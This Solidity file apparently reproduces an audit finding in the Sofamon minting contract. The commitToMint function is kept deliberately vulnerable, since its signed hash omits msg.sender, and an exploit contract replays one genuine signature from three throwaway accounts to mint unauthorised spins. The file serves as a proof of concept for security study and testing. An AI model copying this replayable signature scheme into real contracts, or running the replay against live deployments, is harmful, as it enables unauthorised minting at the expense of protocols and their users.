// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Sofamon (August) finding 41365 (H-01):
// "Signatures can be replayed using different addresses".
//
// Real audited source (the vulnerable function is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   protocol Sofamon August
//   report   github.com/pashov/audits/blob/master/team/md/Sofamon-security-review-August.md
//   fn       commitToMint
//
// Root cause: the signer-authorization digest
//
//     bytes32 hash = keccak256(abi.encodePacked(_collectionId, spins, nonce, msg.value, minter));
//
// omits `msg.sender`. The only per-caller binding is `nonce = userNonce[msg.sender]`,
// which for any FRESH account is 0. A single signer-authorized signature (intended
// to be consumed once) is therefore accepted by the `approved == signer` check from
// ANY number of different `msg.sender` accounts that each still sit at nonce 0.
//
// An attacker who was authorized once for `minter` (spins=5, nonce=0, value=0) reads
// the signature off-chain / on-chain and REPLAYS the identical bytes from a series of
// throwaway accounts (each nonce 0). Every replay passes the signer check and mints a
// NEW valid ticket crediting the same `minter` with another 5 spins — inflating a
// one-time authorization into an unbounded mint allocation the signer never granted.
//
// src=embedded: `commitToMint` is reproduced byte-for-byte from the finding's embedded
// snippet (the @> line and all arithmetic identical). `ECDSA.recover` /
// `toEthSignedMessageHash` are faithful minimal recreations of the OpenZeppelin helpers
// so the verbatim `hash.toEthSignedMessageHash()` / `ECDSA.recover(...)` calls resolve.
// The signer key is held legitimately: the exploit REPLAYS a genuinely-valid signature
// across fresh callers — it does not forge crypto. Non-vulnerable dependencies (RNG,
// fee sink, nonce/ticket bookkeeping) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal recreation of the OpenZeppelin ECDSA helpers used verbatim
///      by `commitToMint` (`hash.toEthSignedMessageHash()` and `ECDSA.recover`).
library ECDSA {
    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig length");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        return ecrecover(hash, v, r, s);
    }
}

/// @dev Faithful minimal ERC20 double used purely as the loss/harm marker token.
contract MarkerToken {
    string public name = "Sofamon Unauthorized Spins";
    string public symbol = "SPINS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful minimal double of the protocol RNG. `commitToMint` calls `rng.rng()`
///      to allocate a fresh ticket nonce; distinct values keep tickets from colliding.
contract Rng {
    uint256 internal counter;

    function rng() external returns (uint256) {
        counter += 1;
        return uint256(keccak256(abi.encode(counter, address(this))));
    }
}

interface IRng {
    function rng() external returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `commitToMint` reproduced VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract SofamonMinter {
    using ECDSA for bytes32;

    address public commitController;
    address public signer;
    address public protocolFeeTo;
    IRng public rng;

    mapping(address => uint256) public userNonce;

    struct NonceData {
        address owner;
        uint128 collectionId;
        uint128 spins;
    }

    mapping(uint256 => NonceData) public dataOf;

    error NotApproved();

    event MintCommited(
        address indexed sender,
        address indexed minter,
        uint256 spins,
        uint256 value,
        uint256 nonce,
        uint256 ticketNonce
    );

    constructor(address _commitController, address _signer, address _protocolFeeTo, IRng _rng) {
        commitController = _commitController;
        signer = _signer;
        protocolFeeTo = _protocolFeeTo;
        rng = _rng;
    }

    /// @param _collectionId The Id of the collection you wish to roll for
    /// @param spins The amount of spins you wish to roll
    /// @param signature A signature commit to the price, nonce, and minter from the authority address
    ///
    /// @return ticketNonce The nonce to use to claim your mint
    function commitToMint(uint256 _collectionId, uint256 spins, address minter, bytes memory signature) public payable returns (uint256 ticketNonce) {
        if (msg.sender != commitController) {
            uint256 nonce = userNonce[msg.sender];
            bytes32 hash = keccak256(abi.encodePacked(_collectionId, spins, nonce, msg.value, minter)); // @> VULN: signed hash omits msg.sender, so the SAME signer signature validates from any fresh account (nonce 0) — replayable across different addresses
            bytes32 signedHash = hash.toEthSignedMessageHash();
            address approved = ECDSA.recover(signedHash, signature);

            if (approved != signer) {
                revert NotApproved();
            }
        }

        if (msg.value != 0) {
            payable(protocolFeeTo).transfer(msg.value);
        }

        ticketNonce = rng.rng();

        NonceData memory data = NonceData({ owner: minter, collectionId: uint128(_collectionId), spins: uint128(spins) });

        uint256 _userNonce = userNonce[msg.sender];
        userNonce[msg.sender] = _userNonce + 1;

        dataOf[ticketNonce] = data;

        emit MintCommited(msg.sender, minter, spins, msg.value, _userNonce + 1, ticketNonce);
    }
}

/// @dev Faithful double of a throwaway attacker account. Each `new Relayer()` is a
///      distinct `msg.sender` whose `userNonce` in the minter is 0 — exactly the
///      fresh-account condition the replay exploits.
contract Relayer {
    function fire(SofamonMinter v, uint256 collectionId, uint256 spins, address minter, bytes memory sig)
        external
        returns (uint256)
    {
        return v.commitToMint(collectionId, spins, minter, sig);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the signer authorizes ONE commit (spins=5, nonce=0, value=0) for
// minter=ATTACKER. The attacker consumes it once, then REPLAYS the identical
// signature bytes from two more fresh accounts (each nonce 0). All three pass the
// `approved == signer` check and mint valid tickets crediting ATTACKER — 15 spins
// granted where the signer authorized only 5. The 10 unauthorized spins are the loss.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // minter bound into the signature (attacker-controlled).
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // signer = address for private key 0x…01 (held legitimately; signature is genuine).
    address internal constant SIGNER = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
    // an unrelated commitController so the signature branch always executes.
    address internal constant COMMIT_CONTROLLER = 0x000000000000000000000000000000000000c0DE;
    address internal constant PROTOCOL_FEE_TO = 0x00000000000000000000000000000000000FEE00;

    uint256 internal constant COLLECTION_ID = 1;
    uint256 internal constant SPINS = 5;

    // Precomputed offline (cast, signer key 0x…01):
    //   inner  = keccak256(abi.encodePacked(uint256(1), uint256(5), uint256(0), uint256(0), ATTACKER))
    //   digest = keccak256("\x19Ethereum Signed Message:\n32" || inner)
    //   (r,s,v) = sign(digest) with the signer key (--no-hash)
    // The digest omits msg.sender — that is exactly why the SAME bytes validate from
    // every fresh caller. Signed for collectionId=1, spins=5, nonce=0, value=0, minter=ATTACKER.
    bytes32 internal constant SIG_R = 0x06da40d11f7e49bb244de689548b1abd86ed67239b5e10faf29737abee552dbf;
    bytes32 internal constant SIG_S = 0x42c2479699137ae7fb75a6246860761b169f236056f324add58a989d5a624767;
    uint8 internal constant SIG_V = 27;

    MarkerToken public marker; // child nonce 1 (loss marker)
    Rng public rngDouble; // child nonce 2
    SofamonMinter public vuln; // child nonce 3 (VULN)

    // Exposed results for the driver's harm assertions.
    uint256 public ticketCount; // valid tickets minted with ONE signature (3)
    uint256 public authorizedSpins; // spins the signer actually authorized (5)
    uint256 public grantedSpins; // spins actually granted to ATTACKER (15)
    uint256 public unauthorizedSpins; // grantedSpins - authorizedSpins (10)
    uint256 public distinctSendersPassed; // distinct msg.senders that passed the signer check (3)
    uint256 public sinkHarm; // unauthorized spins recorded at SINK

    constructor() {
        marker = new MarkerToken(); // nonce 1
        rngDouble = new Rng(); // nonce 2
        vuln = new SofamonMinter(COMMIT_CONTROLLER, SIGNER, PROTOCOL_FEE_TO, IRng(address(rngDouble))); // nonce 3 (VULN)
    }

    function run() external {
        bytes memory sig = abi.encodePacked(SIG_R, SIG_S, SIG_V);

        // Three throwaway attacker accounts — each a distinct msg.sender at nonce 0.
        Relayer a = new Relayer();
        Relayer b = new Relayer();
        Relayer c = new Relayer();

        // (1) AUTHORIZED: the single commit the signer intended to grant.
        uint256 t1 = a.fire(vuln, COLLECTION_ID, SPINS, ATTACKER, sig);
        // (2) REPLAY: identical signature bytes, different fresh msg.sender (nonce 0).
        uint256 t2 = b.fire(vuln, COLLECTION_ID, SPINS, ATTACKER, sig);
        // (3) REPLAY again from a third fresh account — still passes the signer check.
        uint256 t3 = c.fire(vuln, COLLECTION_ID, SPINS, ATTACKER, sig);

        // Every ticket is a valid, signer-checked mint commitment crediting ATTACKER.
        require(t1 != t2 && t2 != t3 && t1 != t3, "tickets must be distinct");
        (address o1,, uint128 s1) = vuln.dataOf(t1);
        (address o2,, uint128 s2) = vuln.dataOf(t2);
        (address o3,, uint128 s3) = vuln.dataOf(t3);
        require(o1 == ATTACKER && o2 == ATTACKER && o3 == ATTACKER, "all tickets credit ATTACKER");
        require(s1 == SPINS && s2 == SPINS && s3 == SPINS, "each ticket carries 5 spins");

        // Three distinct addresses passed `approved == signer` with the SAME bytes.
        require(address(a) != address(b) && address(b) != address(c) && address(a) != address(c), "distinct senders");
        distinctSendersPassed = 3;

        ticketCount = 3;
        authorizedSpins = SPINS; // signer authorized exactly one commit = 5 spins
        grantedSpins = 3 * SPINS; // 15 spins actually minted to ATTACKER
        unauthorizedSpins = grantedSpins - authorizedSpins; // 10 spins never authorized

        // No positive token transfer to the attacker (the gain is unauthorized mint
        // allocation), so the harm magnitude is recorded at the SINK marker: 10 spins.
        sinkHarm = unauthorizedSpins * 1e18;
        marker.mint(SINK, sinkHarm);

        require(unauthorizedSpins == 10, "expected 10 unauthorized spins");
        require(marker.balanceOf(SINK) == 10e18, "harm marker not at sink");
    }
}
